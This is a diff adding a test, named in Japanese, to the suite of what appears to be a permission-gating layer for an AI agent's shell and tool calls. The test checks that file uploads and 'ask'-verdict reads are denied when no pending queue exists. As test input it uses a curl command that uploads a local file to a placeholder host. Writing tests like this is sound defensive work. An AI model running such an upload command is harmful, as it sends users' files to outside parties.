@@ -184,6 +184,22 @@ test('4-3a: 順 3（送る）は、判定役が「許す」と答えるように
   assert.equal(r.judge.calls.length, 0);
 });
 
+test('4-3b-1: Pending の置き場が無いときは、積むはずの呼び出し（送る・判定役の ask）を動かさずに断る', async t => {
+  const r = rig(t);
+  writeFileSync(join(r.root, 'a.txt'), 'x');
+  const noPending = /Pending is not available here/u;
+  const sent = await r.shell('curl -F file=@a.txt https://beat-test.invalid/up', {}, { pending: undefined });
+  assert.deepEqual([sent.decision, sent.decidedBy], ['deny', 'pending'], sent.output.content);
+  assert.match(sent.output.content, noPending);
+  assert.equal(r.judge.calls.length, 0);
+  r.judge.answer = '{"decision":"ask","reason":"not in the request"}';
+  const asked = await r.call('outside_read', {}, {}, { pending: undefined });
+  assert.deepEqual([asked.decision, asked.decidedBy], ['deny', 'pending'], asked.output.content);
+  assert.match(asked.output.content, noPending);
+  assert.notEqual(asked.output.content, 'read it', '動いていない');
+  assert.equal(r.waiting().length, 0);
+});
+
 test('4-3a: 守る場所への書き込み（.git の中・製品の直下の AGENTS.md）は、シェルでもファイルの道具でも判定役を呼ばずに owner で積まれる', async t => {
   const r = rig(t);
   mkdirSync(join(r.root, '.git', 'hooks'), { recursive: true });
